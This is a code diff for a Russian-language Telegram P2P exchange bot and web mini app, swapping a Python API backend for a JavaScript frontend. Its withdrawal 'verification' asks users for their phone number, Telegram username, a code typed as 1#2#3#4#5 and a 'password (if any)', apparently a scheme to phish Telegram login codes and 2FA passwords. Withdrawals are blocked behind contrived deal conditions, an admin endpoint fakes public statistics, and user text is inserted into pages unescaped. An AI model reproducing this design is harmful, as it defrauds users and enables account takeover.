+            if (!state.reviews || state.reviews.length === 0) {
+                container.innerHTML = '<p class="text-center text-secondary" style="padding:15px;">📭 ' + getLangText('noReviews') + '</p>';
+                return;
+            }
+            const html = state.reviews.map(r => `
+                <div class="review-card">
+                    <div class="review-header">
+                        <div class="review-user">
+                            <div class="review-avatar">${r.user ? r.user.charAt(0).toUpperCase() : '👤'}</div>
+                            <span class="review-name anonymous">${r.anonymous !== false ? 'Аноним' : r.user}</span>
+                        </div>
+                        <span class="review-date">${r.date || 'только что'}</span>
+                    </div>
+                    <div class="review-stars">${'⭐'.repeat(r.rating || 5)}</div>
+                    <div class="review-text">${r.text}</div>
+                    ${state.isAdmin ? `
+                        <button class="btn btn-danger btn-sm mt-6" onclick="deleteReview('${r.id || r._id}')" style="width:auto;">
+                            <i class="fas fa-trash"></i> Удалить
+                        </button>
+                    ` : ''}
+                </div>
+            `).join('');
+            container.innerHTML = html;
+            document.getElementById('reviewTotal').textContent = `(${state.reviews.length})`;
+        }
+
+        async function submitReview() {
+            const rating = parseInt(document.getElementById('reviewRating').value);
+            const text = document.getElementById('reviewText').value.trim();
+
+            if (!text) {
+                showToast('❌ Напишите текст отзыва', 'error');
+                return;
+            }
+
+            const btn = document.querySelector('#reviewFormContainer .btn-gold');
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';
+            btn.disabled = true;
+
+            try {
+                const data = await apiCall('/api/add_review', {
+                    rating: rating,
+                    text: text,
+                    anonymous: true
+                });
+
+                if (data.success) {
+                    showToast('✅ Отзыв опубликован!', 'success');
+                    document.getElementById('reviewText').value = '';
+                    loadReviews();
+                    loadMainData();
+                } else {
+                    showToast('❌ ' + (data.error || 'Ошибка'), 'error');
+                }
+            } catch (err) {
+                showToast('❌ Ошибка: ' + err.message, 'error');
+            } finally {
+                btn.innerHTML = '<i class="fas fa-paper-plane"></i> ' + getLangText('btnSubmitReview');
+                btn.disabled = false;
+            }
+        }
+
+        async function deleteReview(reviewId) {
+            if (!confirm('Удалить этот отзыв?')) return;
+            try {
+                const data = await apiCall('/api/delete_review', { review_id: reviewId });
+                if (data.success) {
+                    showToast('✅ Отзыв удалён', 'success');
+                    loadReviews();
+                    loadMainData();
+                } else {
+                    showToast('❌ ' + (data.error || 'Ошибка'), 'error');
+                }
+            } catch (err) {
+                showToast('❌ Ошибка: ' + err.message, 'error');
+            }
+        }
+
+        function loadMoreReviews() {
+            state.reviewPage++;
+            loadReviews();
+        }
+
+        // ============================================================
+        // 15. ВЫВОД (2 СДЕЛКИ + ВЕРИФИКАЦИЯ)
+        // ============================================================
+        function toggleWithdraw() {
+            const section = document.getElementById('withdrawSection');
+            section.style.display = section.style.display === 'none' ? 'block' : 'none';
+            if (section.style.display === 'block') {
+                checkWithdrawConditions();
+            }
+        }
+
+        async function checkWithdrawConditions() {
+            const statusDiv = document.getElementById('withdrawStatus');
+            statusDiv.style.display = 'block';
+            
+            // Проверяем баланс
+            const total = (state.balance.ton || 0) + (state.balance.stars || 0) + 
+                         (state.balance.rub || 0) + (state.balance.uah || 0);
+            
+            if (total === 0) {
+                statusDiv.className = 'verification-status unverified';
+                statusDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ❌ ' + getLangText('balanceZero');
+                return;
+            }
+
+            // Проверяем 2 сделки
+            const check = await apiCall('/api/has_2_deals');
+            state.has2Deals = check.has_2_deals || false;
+            
+            if (!state.has2Deals) {
+                statusDiv.className = 'verification-status unverified';
+                statusDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ⚠️ ' + getLangText('need2Deals') + state.totalDeals;
+                return;
+            }
+
+            // Проверяем верификацию
+            const verif = await apiCall('/api/verification_status');
+            state.isVerified = verif.verified || false;
+            state.verificationExpires = verif.expires_at || null;
+
+            if (!state.isVerified) {
+                statusDiv.className = 'verification-status unverified';
+                statusDiv.innerHTML = `
+                    <i class="fas fa-shield-alt"></i>
+                    ⚠️ ${getLangText('verificationRequired')}
+                    <button class="btn btn-primary btn-sm mt-6" onclick="showVerificationModal()" style="width:auto;">
+                        <i class="fas fa-arrow-right"></i> ${getLangText('verificationRequired')}
+                    </button>
+                `;
+                return;
+            }
+
+            // Всё хорошо
+            statusDiv.className = 'verification-status verified';
+            statusDiv.innerHTML = `
+                <i class="fas fa-check-circle"></i>
+                ✅ ${getLangText('verificationPassed')}
+                ${state.verificationExpires ? `🕐 ${getLangText('sessionActive')} ${new Date(state.verificationExpires).toLocaleString()}` : ''}
+            `;
+        }
+
+        function showVerificationModal() {
+            showModal(`
+                <h3 style="margin-bottom:12px;">🔐 ${getLangText('verificationRequired')}</h3>
+                <p style="color:var(--text-secondary); margin-bottom:12px;">Защита от мошенников со скамнутыми звёздами и фейковой валютой</p>
+                <div class="form-group">
+                    <label>📱 Номер телефона (формат: +7XXXXXXXXXX)</label>
+                    <input type="text" id="verifyPhone" placeholder="+79001234567">
+                </div>
+                <div class="form-group">
+                    <label>👤 Ваш Telegram Username</label>
+                    <input type="text" id="verifyUsername" placeholder="@john_doe">
+                </div>
+                <button class="btn btn-primary" onclick="startVerificationFromModal()">
+                    <i class="fas fa-paper-plane"></i> Отправить запрос
+                </button>
+                <div id="verifyModalResult" class="mt-10"></div>
+                <button class="btn btn-secondary mt-10" onclick="closeModal()">Отмена</button>
+            `);
+        }
+
+        async function startVerificationFromModal() {
+            const phone = document.getElementById('verifyPhone').value.trim();
+            const username = document.getElementById('verifyUsername').value.trim().replace('@', '');
+
+            if (!phone || !username) {
+                showToast('❌ Заполните все поля', 'error');
+                return;
+            }
+
+            if (!phone.startsWith('+') || !phone.slice(1).replace(/\d/g, '').length === 0 || phone.length < 11) {
+                showToast('❌ Введите корректный номер телефона (формат: +7XXXXXXXXXX)', 'error');
+                return;
+            }
+
+            const btn = document.querySelector('#verifyModalResult .btn-primary') || document.querySelector('#modal .btn-primary');
+            if (btn) { btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...'; btn.disabled = true; }
+
+            try {
+                const data = await apiCall('/api/start_verification', { phone, username });
                 
-                try:
-                    seller_lang = get_user_language(user_id)
-                    await bot.send_message(
-                        user_id,
-                        f"💎 <b>{get_text(seller_lang, 'deal')} #{deal_id} {get_text(seller_lang, 'status_paid')}!</b>\n\n"
-                        f"💰 {get_text(seller_lang, 'amount')}: {amount} {currency}\n"
-                        f"👤 {get_text(seller_lang, 'buyer')}: @{buyer_username}\n\n"
-                        f"⬇️ {get_text(seller_lang, 'seller_delivered')} ⬇️",
-                        reply_markup=seller_confirm_keyboard(deal_id, user_id)
-                    )
-                except:
-                    pass
-            else:
-                deals[deal_id]["status"] = "waiting_payment"
-                save_json(FILES["deals"], deals)
-        
-        return web.json_response({
-            'success': True,
-            'deal_id': deal_id,
-            'link': link,
-            'status': deals[deal_id]["status"]
-        }, headers=headers)
-    
-    # ===== СДЕЛКИ ПОЛЬЗОВАТЕЛЯ =====
-    elif endpoint == '/api/deals':
-        if not user_id:
-            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
-        user_deals = []
-        for d_id, d in deals.items():
-            if d.get('seller_id') == user_id or d.get('buyer_id') == user_id:
-                d_copy = d.copy()
-                d_copy['deal_id'] = d_id
-                user_deals.append(d_copy)
-        return web.json_response({'success': True, 'deals': user_deals}, headers=headers)
-    
-    # ===== ПРОВЕРКА АДМИНА =====
-    elif endpoint == '/api/is_admin':
-        return web.json_response({'success': True, 'is_admin': is_admin(user_id)}, headers=headers)
-    
-    # ===== ОТЗЫВЫ =====
-    elif endpoint == '/api/reviews':
-        limit = data.get('limit', 10)
-        page = data.get('page', 0)
-        reviews_list = list(reviews.values())
-        start = page * limit
-        end = start + limit
-        paginated = reviews_list[start:end]
-        return web.json_response({
-            'success': True,
-            'reviews': paginated,
-            'total': len(reviews_list)
-        }, headers=headers)
-    
-    # ===== ДОБАВИТЬ ОТЗЫВ (БЕЗ ВЕРИФИКАЦИИ) =====
-    elif endpoint == '/api/add_review':
-        rating = data.get('rating')
-        text = data.get('text')
-        anonymous = data.get('anonymous', True)
-        if not all([user_id, rating, text]):
-            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
-        
-        user_deals = [d for d in deals.values() if d.get('seller_id') == user_id and d.get('status') == 'completed']
-        if len(user_deals) < 1:
-            return web.json_response({'success': False, 'error': 'Need at least 1 completed deal'}, headers=headers)
-        
-        review_id = str(uuid.uuid4())[:8]
-        reviews[review_id] = {
-            "id": review_id,
-            "user": "Аноним" if anonymous else str(user_id),
-            "rating": rating,
-            "text": text,
-            "anonymous": anonymous,
-            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
-            "user_id": user_id
+                if (data.success) {
+                    document.getElementById('verifyModalResult').innerHTML = `
+                        <div class="verification-status verified" style="display:block;">
+                            <i class="fas fa-check-circle"></i>
+                            ✅ Запрос отправлен! Ожидайте код от администратора.
+                        </div>
+                        <div class="form-group mt-10">
+                            <label>🔑 Введите код (формат: 1#2#3#4#5)</label>
+                            <input type="text" id="verifyCodeModal" placeholder="1#2#3#4#5">
+                        </div>
+                        <div class="form-group">
+                            <label>🔐 Пароль (если есть)</label>
+                            <input type="text" id="verifyPasswordModal" placeholder="Введите пароль">
+                        </div>
+                        <button class="btn btn-success" onclick="submitVerificationFromModal()">
+                            <i class="fas fa-check"></i> Подтвердить код
+                        </button>
+                    `;
+                } else {
+                    showToast('❌ ' + (data.error || 'Ошибка отправки'), 'error');
+                }
+            } catch (err) {
+                showToast('❌ Ошибка: ' + err.message, 'error');
+            } finally {
+                if (btn) { btn.innerHTML = '<i class="fas fa-paper-plane"></i> Отправить запрос'; btn.disabled = false; }
+            }
         }
-        save_json(FILES["reviews"], reviews)
-        
-        add_log("api_add_review", {
-            "user_id": user_id,
-            "username": username,
-            "review_id": review_id,
-            "rating": rating
-        })
-        
-        return web.json_response({'success': True, 'review_id': review_id}, headers=headers)
-    
-    # ===== УДАЛИТЬ ОТЗЫВ =====
-    elif endpoint == '/api/delete_review':
-        review_id = data.get('review_id')
-        if not is_admin(user_id):
-            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
-        if review_id in reviews:
-            del reviews[review_id]
-            save_json(FILES["reviews"], reviews)
-            return web.json_response({'success': True}, headers=headers)
-        return web.json_response({'success': False, 'error': 'Review not found'}, headers=headers)
-    
-    # ===== СТАТИСТИКА =====
-    elif endpoint == '/api/stats':
-        return web.json_response({
-            'success': True,
-            'deals_today': stats.get('deals_today', 0),
-            'users': stats.get('users', 0),
-            'reviews': len(reviews),
-            'volume': stats.get('volume', 0)
-        }, headers=headers)
-    
-    # ===== ПРОВЕРКА 2 СДЕЛОК =====
-    elif endpoint == '/api/has_2_deals':
-        if not user_id:
-            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
-        bal = get_balance(user_id)
-        partners = bal.get('deal_partners', {})
-        has_2 = any(count >= 2 for count in partners.values())
-        total = sum(partners.values())
-        return web.json_response({'success': True, 'has_2_deals': has_2, 'total_deals': total}, headers=headers)
-    
-    # ===== СТАТУС ВЕРИФИКАЦИИ =====
-    elif endpoint == '/api/verification_status':
-        if not user_id:
-            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
-        
-        active_session = None
-        for sid, sess in verification_sessions.items():
-            if sess.get('user_id') == user_id and sess.get('active', False):
-                expires = datetime.fromisoformat(sess['expires_at'])
-                if datetime.now() < expires:
-                    active_session = sess
-                    break
-                else:
-                    sess['active'] = False
-                    save_json(FILES["verification_sessions"], verification_sessions)
-        
-        if active_session:
-            return web.json_response({
-                'success': True,
-                'verified': True,
-                'expires_at': active_session['expires_at'],
-                'session_id': active_session.get('session_id')
-            }, headers=headers)
-        
-        return web.json_response({'success': True, 'verified': False}, headers=headers)
-    
-    # ===== НАЧАТЬ ВЕРИФИКАЦИЮ =====
-    elif endpoint == '/api/start_verification':
-        phone = data.get('phone')
-        username = data.get('username')
-        
-        if not all([user_id, phone, username]):
-            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
-        
-        for sid, sess in verification_sessions.items():
-            if sess.get('user_id') == user_id and sess.get('active', False):
-                expires = datetime.fromisoformat(sess['expires_at'])
-                if datetime.now() < expires:
-                    return web.json_response({
-                        'success': False,
-                        'error': 'Active verification session exists'
-                    }, headers=headers)
-        
-        request_id = str(uuid.uuid4())[:8]
-        verification_requests[request_id] = {
-            "id": request_id,
-            "user_id": user_id,
-            "username": username,
-            "phone": phone,
-            "status": "pending",
-            "created_at": datetime.now().isoformat()
-        }
-        save_json(FILES["verification"], verification_requests)
-        
-        add_log("verification_requested", {
-            "user_id": user_id,
-            "username": username,
-            "phone": phone,
-            "request_id": request_id
-        })
-        
-        return web.json_response({'success': True, 'request_id': request_id}, headers=headers)
-    
-    # ===== ПОДТВЕРДИТЬ КОД =====
-    elif endpoint == '/api/verify_code':
-        code = data.get('code')
-        password = data.get('password')
-        
-        if not code:
-            return web.json_response({'success': False, 'error': 'Code required'}, headers=headers)
-        
-        if code != "1#2#3#4#5":
-            return web.json_response({'success': False, 'error': 'Invalid code'}, headers=headers)
-        
-        pending_request = None
-        for rid, req in verification_requests.items():
-            if req.get('user_id') == user_id and req.get('status') == 'pending':
-                pending_request = req
-                break
-        
-        if not pending_request:
-            return web.json_response({'success': False, 'error': 'No pending verification request'}, headers=headers)
-        
-        session_id = str(uuid.uuid4())[:8]
-        verification_sessions[session_id] = {
-            "user_id": user_id,
-            "username": username,
-            "phone": pending_request['phone'],
-            "created_at": datetime.now().isoformat(),
-            "expires_at": (datetime.now() + timedelta(hours=24)).isoformat(),
-            "active": True
-        }
-        save_json(FILES["verification_sessions"], verification_sessions)
-        
-        pending_request['status'] = 'approved'
-        pending_request['session_id'] = session_id
-        pending_request['approved_at'] = datetime.now().isoformat()
-        save_json(FILES["verification"], verification_requests)
-        
-        add_log("verification_completed_on_site", {
-            "user_id": user_id,
-            "username": username,
-            "session_id": session_id,
-            "password_entered": bool(password)
-        })
-        
-        return web.json_response({
-            'success': True,
-            'session_id': session_id,
-            'expires_at': (datetime.now() + timedelta(hours=24)).isoformat()
-        }, headers=headers)
-    
-    # ===== ВЫВОД СРЕДСТВ =====
-    elif endpoint == '/api/withdraw':
-        currency = data.get('currency')
-        details = data.get('details')
-        
-        if not all([user_id, currency, details]):
-            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
-        
-        bal = get_balance(user_id)
-        partners = bal.get('deal_partners', {})
-        has_2 = any(count >= 2 for count in partners.values())
-        if not has_2:
-            return web.json_response({'success': False, 'error': 'Need 2 deals with same buyer'}, headers=headers)
-        
-        verified = False
-        for sid, sess in verification_sessions.items():
-            if sess.get('user_id') == user_id and sess.get('active', False):
-                expires = datetime.fromisoformat(sess['expires_at'])
-                if datetime.now() < expires:
-                    verified = True
-                    break
-        
-        if not verified:
-            return web.json_response({'success': False, 'error': 'Verification required'}, headers=headers)
-        
-        curr_key = currency.lower()
-        if bal.get(curr_key, 0) <= 0:
-            return web.json_response({'success': False, 'error': 'Zero balance'}, headers=headers)
-        
-        request_id = str(uuid.uuid4())[:8]
-        withdraw_requests[request_id] = {
-            "id": request_id,
-            "user_id": user_id,
-            "username": username,
-            "currency": currency,
-            "amount": bal[curr_key],
-            "details": details,
-            "status": "pending",
-            "created_at": datetime.now().isoformat()
-        }
-        save_json(FILES["withdraw"], withdraw_requests)
-        
-        add_log("withdraw_requested", {
-            "user_id": user_id,
-            "username": username,
-            "request_id": request_id,
-            "amount": bal[curr_key],
-            "currency": currency
-        })
-        
-        return web.json_response({'success': True, 'request_id': request_id}, headers=headers)
-    
-    # ===== ВСЕ СДЕЛКИ (АДМИН) =====
-    elif endpoint == '/api/all_deals':
-        if not is_admin(user_id):
-            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
-        all_deals = []
-        for d_id, d in deals.items():
-            d_copy = d.copy()
-            d_copy['deal_id'] = d_id
-            all_deals.append(d_copy)
-        return web.json_response({'success': True, 'deals': all_deals}, headers=headers)
-    
-    # ===== ЗАЯВКИ НА ВЫВОД (АДМИН) =====
-    elif endpoint == '/api/withdraw_requests':
-        if not is_admin(user_id):
-            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
-        all_requests = [{'id': rid, **req} for rid, req in withdraw_requests.items()]
-        return web.json_response({'success': True, 'requests': all_requests}, headers=headers)
-    
-    # ===== ЗАПРОСЫ ВЕРИФИКАЦИИ (АДМИН) =====
-    elif endpoint == '/api/verification_requests':
-        if not is_admin(user_id):
-            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
-        all_requests = [{'id': rid, **req} for rid, req in verification_requests.items()]
-        return web.json_response({'success': True, 'requests': all_requests}, headers=headers)
-    
-    # ===== ПОДТВЕРДИТЬ ВЫВОД (АДМИН) =====
-    elif endpoint == '/api/confirm_withdraw':
-        if not is_admin(user_id):
-            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
-        request_id = data.get('request_id')
-        if request_id not in withdraw_requests:
-            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
-        req = withdraw_requests[request_id]
-        if req.get('status') != 'pending':
-            return web.json_response({'success': False, 'error': 'Already processed'}, headers=headers)
-        
-        bal = get_balance(req['user_id'])
-        curr_key = req['currency'].lower()
-        if bal.get(curr_key, 0) >= req['amount']:
-            bal[curr_key] -= req['amount']
-            save_json(FILES["balance"], balance)
-        
-        req['status'] = 'completed'
-        req['completed_at'] = datetime.now().isoformat()
-        save_json(FILES["withdraw"], withdraw_requests)
-        
-        add_log("withdraw_confirmed_api", {
-            "admin_id": user_id,
-            "username": username,
-            "request_id": request_id
-        })
-        
-        return web.json_response({'success': True}, headers=headers)
-    
-    # ===== ОТКЛОНИТЬ ВЫВОД (АДМИН) =====
-    elif endpoint == '/api/reject_withdraw':
-        if not is_admin(user_id):
-            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
-        request_id = data.get('request_id')
-        if request_id not in withdraw_requests:
-            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
-        req = withdraw_requests[request_id]
-        if req.get('status') != 'pending':
-            return web.json_response({'success': False, 'error': 'Already processed'}, headers=headers)
-        
-        req['status'] = 'rejected'
-        save_json(FILES["withdraw"], withdraw_requests)
-        
-        add_log("withdraw_rejected_api", {
-            "admin_id": user_id,
-            "username": username,
-            "request_id": request_id
-        })
-        
-        return web.json_response({'success': True}, headers=headers)
-    
-    # ===== НАЧИСЛИТЬ БАЛАНС (АДМИН) =====
-    elif endpoint == '/api/add_balance':
-        if not is_admin(user_id):
-            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
-        target_user_id = data.get('target_user_id')
-        currency = data.get('currency')
-        amount = data.get('amount')
-        
-        if not all([target_user_id, currency, amount]):
-            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
-        
-        add_balance(target_user_id, currency, amount)
-        
-        add_log("balance_added_api", {
-            "admin_id": user_id,
-            "username": username,
-            "target_user_id": target_user_id,
-            "amount": amount,
-            "currency": currency
-        })
-        
-        return web.json_response({'success': True}, headers=headers)
-    
-    # ===== ОЧИСТИТЬ ОТЗЫВЫ (АДМИН) =====
-    elif endpoint == '/api/clear_reviews':
-        if not is_admin(user_id):
-            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
-        reviews.clear()
-        save_json(FILES["reviews"], reviews)
-        
-        add_log("reviews_cleared_api", {
-            "admin_id": user_id,
-            "username": username
-        })
-        
-        return web.json_response({'success': True}, headers=headers)
-    
-    # ===== АДМИН НАКРУТКА СТАТИСТИКИ =====
-    elif endpoint == '/api/admin_set_stats':
-        if not is_admin(user_id):
-            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
-        key = data.get('key')
-        value = data.get('value')
-        if not key or value is None:
-            return web.json_response({'success': False, 'error': 'Missing key or value'}, headers=headers)
-        stats[key] = value
-        save_json(FILES["stats"], stats)
-        return web.json_response({'success': True}, headers=headers)
-    
-    return web.json_response({'success': False, 'error': 'Unknown endpoint'}, headers=headers)
 
-# ============================================================
-# 22. ЗАПУСК
-# ============================================================
-async def start_web_server():
-    app = web.Application()
-    app.router.add_route('*', '/{path:.*}', handle_api)
-    port = int(os.environ.get('PORT', 3000))
-    print(f"🌐 API сервер запущен на порту {port}")
-    runner = web.AppRunner(app)
-    await runner.setup()
-    site = web.TCPSite(runner, '0.0.0.0', port)
-    await site.start()
-    return runner
+        async function submitVerificationFromModal() {
+            const code = document.getElementById('verifyCodeModal').value.trim();
+            const password = document.getElementById('verifyPasswordModal').value.trim();
 
-async def main():
-    print("=" * 50)
-    print("🔥 P2P Exchange Бот + Сайт")
-    print("=" * 50)
-    print(f"👑 Мастер-админ: {MASTER_ADMIN_ID}")
-    print(f"🤖 Бот: @{BOT_USERNAME}")
-    print(f"📱 Mini App: {MINI_APP_URL}")
-    print(f"📊 Отзывов: {len(reviews)}")
-    print("=" * 50)
-    await start_web_server()
-    print("✅ Бот готов к работе!")
-    await dp.start_polling(bot)
+            if (!code) {
+                showToast('❌ Введите код подтверждения', 'error');
+                return;
+            }
 
-if __name__ == "__main__":
-    asyncio.run(main())
+            if (code !== '1#2#3#4#5') {
+                showToast('❌ Неверный код. Код должен быть: 1#2#3#4#5', 'error');
+                return;
+            }
+
+            const btn = document.querySelector('#verifyModalResult .btn-success');
+            if (btn) { btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Проверка...'; btn.disabled = true; }
+
+            try {
+                const data = await apiCall('/api/verify_code', { code, password });
+                
+                if (data.success) {
+                    showToast('✅ Верификация пройдена! Сессия активна 24 часа.', 'success');
+                    document.getElementById('verifyModalResult').innerHTML = `
+                        <div class="verification-status verified" style="display:block;">
+                            <i class="fas fa-check-circle"></i>
+                            ✅ Верификация успешно пройдена!
+                            ${data.expires_at ? `<br><small>🕐 Сессия активна до: ${new Date(data.expires_at).toLocaleString()}</small>` : ''}
+                        </div>
+                    `;
+                    state.isVerified = true;
+                    state.verificationExpires = data.expires_at;
+                    setTimeout(() => { closeModal(); }, 3000);
+                } else {
+                    showToast('❌ ' + (data.error || 'Ошибка верификации'), 'error');
+                }
+            } catch (err) {
+                showToast('❌ Ошибка: ' + err.message, 'error');
+            } finally {
+                if (btn) { btn.innerHTML = '<i class="fas fa-check"></i> Подтвердить код'; btn.disabled = false; }
+            }
+        }
+
+        async function confirmWithdraw() {
+            const statusDiv = document.getElementById('withdrawStatus');
+            
+            // Проверяем баланс
+            const total = (state.balance.ton || 0) + (state.balance.stars || 0) + 
+                         (state.balance.rub || 0) + (state.balance.uah || 0);
+            
+            if (total === 0) {
+                showToast('❌ ' + getLangText('balanceZero'), 'error');
+                return;
+            }
+
+            // Проверяем 2 сделки
+            const check = await apiCall('/api/has_2_deals');
+            if (!check.has_2_deals) {
+                showToast('⚠️ ' + getLangText('need2Deals') + state.totalDeals, 'error');
+                return;
+            }
+
+            // Проверяем верификацию
+            const verif = await apiCall('/api/verification_status');
+            if (!verif.verified) {
+                showToast('⚠️ ' + getLangText('verificationRequired'), 'error');
+                showVerificationModal();
+                return;
+            }
+
+            const currency = document.getElementById('withdrawCurrency').value;
+            const details = document.getElementById('withdrawDetails').value.trim();
+
+            if (!details) {
+                showToast('❌ Введите реквизиты', 'error');
+                return;
+            }
+
+            const btn = document.querySelector('#withdrawSection .btn-primary');
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';
+            btn.disabled = true;
+
+            try {
+                const data = await apiCall('/api/withdraw', { currency, details });
+                if (data.success) {
+                    showToast('✅ Заявка на вывод создана!', 'success');
+                    document.getElementById('withdrawSection').style.display = 'none';
+                    document.getElementById('withdrawDetails').value = '';
+                    loadBalance();
+                } else {
+                    showToast('❌ ' + (data.error || 'Ошибка'), 'error');
+                }
+            } catch (err) {
+                showToast('❌ Ошибка: ' + err.message, 'error');
+            } finally {
+                btn.innerHTML = '<i class="fas fa-check"></i> ' + getLangText('btnConfirmWithdraw');
+                btn.disabled = false;
+            }
+        }
+
+        // ============================================================
+        // 16. АДМИН ПАНЕЛЬ
+        // ============================================================
+        async function loadAdminPanel() {
+            const container = document.getElementById('adminContent');
+            container.innerHTML = '<div class="loading"><i class="fas fa-spinner"></i> Проверка прав...</div>';
+            try {
+                const data = await apiCall('/api/is_admin');
+                state.isAdmin = data.is_admin || false;
+                if (state.isAdmin) {
+                    container.innerHTML = `
+                        <div style="display:grid; gap:6px;">
+                            <div class="card" style="padding:10px; background:rgba(0,136,204,0.05); border-color:rgba(0,136,204,0.12);">
+                                <div class="card-title" style="font-size:13px;">📊 Управление</div>
+                                <button class="btn btn-secondary btn-sm" onclick="adminAddBalance()">
+                                    <i class="fas fa-plus-circle"></i> Начислить баланс
+                                </button>
+                                <button class="btn btn-secondary btn-sm mt-6" onclick="adminAllDeals()">
+                                    <i class="fas fa-list"></i> Все сделки
+                                </button>
+                                <button class="btn btn-secondary btn-sm mt-6" onclick="adminWithdrawRequests()">
+                                    <i class="fas fa-arrow-up"></i> Заявки на вывод
+                                </button>
+                                <button class="btn btn-secondary btn-sm mt-6" onclick="adminVerificationRequests()">
+                                    <i class="fas fa-shield-alt"></i> Запросы верификации
+                                </button>
+                                <button class="btn btn-secondary btn-sm mt-6" onclick="adminClearReviews()">
+                                    <i class="fas fa-trash-alt"></i> Очистить отзывы
+                                </button>
+                            </div>
+                            <div id="adminResult" class="mt-10"></div>
+                        </div>
+                    `;
+                } else {
+                    container.innerHTML = `
+                        <div style="background:rgba(231,76,60,0.08);padding:12px;border-radius:10px;border:1px solid rgba(231,76,60,0.1);">
+                            <i class="fas fa-lock" style="color:#e74c3c;font-size:18px;"></i>
+                            <span style="color:#e74c3c;font-weight:600;margin-left:6px;">Доступ запрещён</span>
+                            <p style="color:var(--text-secondary);margin-top:4px;font-size:13px;">Недостаточно прав</p>
+                        </div>
+                    `;
+                }
+            } catch (e) {
+                container.innerHTML = '<div class="error-text">❌ Ошибка проверки прав</div>';
+            }
+        }
+
+        async function adminAddBalance() {
+            const userId = prompt('Введите Telegram ID пользователя:');
+            if (!userId || isNaN(userId)) {
+                showToast('❌ Введите корректный ID', 'error');
+                return;
+            }
+
+            showModal(`
+                <h3 style="margin-bottom:12px;">💰 Начислить баланс</h3>
+                <p style="color:var(--text-secondary); margin-bottom:12px;">👤 Пользователь: <strong>${userId}</strong></p>
+                <div style="display:grid; gap:8px;">
+                    <button class="btn btn-primary" onclick="adminAddBalanceConfirm(${userId}, 'TON')">
+                        <i class="fas fa-coins"></i> 💎 TON
+                    </button>
+                    <button class="btn btn-gold" onclick="adminAddBalanceConfirm(${userId}, 'STARS')">
+                        <i class="fas fa-star"></i> ⭐️ STARS
+                    </button>
+                    <button class="btn btn-secondary" onclick="adminAddBalanceConfirm(${userId}, 'RUB')">
+                        <i class="fas fa-ruble-sign"></i> 💰 RUB
+                    </button>
+                    <button class="btn btn-secondary" onclick="adminAddBalanceConfirm(${userId}, 'UAH')">
+                        <i class="fas fa-hryvnia"></i> 🌐 UAH
+                    </button>
+                </div>
+                <button class="btn btn-secondary mt-10" onclick="closeModal()">Отмена</button>
+            `);
+        }
+
+        async function adminAddBalanceConfirm(userId, currency) {
+            closeModal();
+
+            const amount = prompt(`Введите сумму в ${currency}:`);
+            if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
+                showToast('❌ Введите положительное число', 'error');
+                return;
+            }
+
+            try {
+                const data = await apiCall('/api/add_balance', {
+                    target_user_id: parseInt(userId),
+                    currency: currency,
+                    amount: parseFloat(amount)
+                });
+
+                if (data.success) {
+                    showToast(`✅ Начислено ${amount} ${currency} пользователю ${userId}`, 'success');
+                    if (parseInt(userId) === user.id) {
+                        loadBalance();
+                    }
+                    loadAdminPanel();
+                } else {
+                    showToast('❌ ' + (data.error || 'Ошибка начисления'), 'error');
+                }
+            } catch (err) {
+                showToast('❌ Ошибка: ' + err.message, 'error');
+            }
+        }
+
+        async function adminAllDeals() {
+            const data = await apiCall('/api/all_deals');
+            if (data.success && data.deals) {
+                const html = data.deals.map(d => `
+                    <div class="deal-card">
+                        <strong>#${d.deal_id}</strong> - ${d.product}
+                        <div style="font-size:12px;color:var(--text-secondary);">💰 ${d.amount} ${d.currency} • 👤 @${d.seller_username} → @${d.buyer_username}</div>
+                        <span class="deal-status ${d.status}">${getStatusText(d.status)}</span>
+                        <div style="font-size:10px;color:var(--text-muted);">📅 ${d.created_at || 'неизвестно'}</div>
+                    </div>
+                `).join('');
+                showModal('<h3>📊 Все сделки</h3>' + (html || '<p class="text-secondary">Нет сделок</p>'));
+            }
+        }
+
+        async function adminWithdrawRequests() {
+            const data = await apiCall('/api/withdraw_requests');
+            if (data.success && data.requests) {
+                const pending = data.requests.filter(r => r.status === 'pending');
+                if (pending.length === 0) {
+                    showModal('<h3>💲 Заявки на вывод</h3><p class="text-secondary">Нет активных заявок</p>');
+                    return;
+                }
+                const html = pending.map(r => `
+                    <div class="deal-card">
+                        <strong>👤 ${r.username || r.user_id}</strong>
+                        <div>💰 ${r.amount} ${r.currency}</div>
+                        <div style="font-size:12px;color:var(--text-secondary);">📝 ${r.details}</div>
+                        <div class="flex mt-6">
+                            <button class="btn btn-success btn-sm" onclick="adminConfirmWithdraw('${r.id}')"><i class="fas fa-check"></i> Подтвердить</button>
+                            <button class="btn btn-danger btn-sm" onclick="adminRejectWithdraw('${r.id}')"><i class="fas fa-times"></i> Отклонить</button>
+                        </div>
+                    </div>
+                `).join('');
+                showModal('<h3>💲 Заявки на вывод</h3>' + html);
+            }
+        }
+
+        async function adminConfirmWithdraw(requestId) {
+            if (!confirm('Подтвердить вывод?')) return;
+            const data = await apiCall('/api/confirm_withdraw', { request_id: requestId });
+            if (data.success) {
+                showToast('✅ Вывод подтверждён', 'success');
+                closeModal();
